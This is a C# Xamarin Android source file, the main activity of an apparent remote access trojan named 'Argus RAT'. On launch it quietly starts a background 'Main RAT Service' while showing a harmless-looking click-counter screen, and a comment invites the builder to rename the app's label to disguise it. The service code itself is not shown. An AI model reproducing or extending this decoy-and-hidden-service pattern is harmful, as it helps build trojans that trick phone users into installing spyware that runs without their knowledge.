using System;
using Android.App;
using Android.Content;
using Android.Runtime;
using Android.Views;
using Android.Widget;
using Android.OS;

namespace Argus___RAT
{
    // Change name and label below! (e.g. Label="MyCoolAppName")
    [Activity(Label = "My cool App!", MainLauncher = true, Icon = "@drawable/icon")]
    public class MainActivity : Activity
    {
        int count = 1;

        protected override void OnCreate(Bundle bundle)
        {
            base.OnCreate(bundle);

            // Init Xamarin.Forms
            // Xamarin.Forms.Forms.Init(this, bundle);

            // Run Main RAT Service
            StartService(new Intent(this, typeof(MainService)));


            // Build Main screen

            // Set our view from the "main" layout resource
            SetContentView(Resource.Layout.Main);

            // Get our button from the layout resource,
            // and attach an event to it
            Button button = FindViewById<Button>(Resource.Id.MyButton);

            button.Click += delegate { button.Text = string.Format("{0} clicks!", count++); };
        }
    }
}

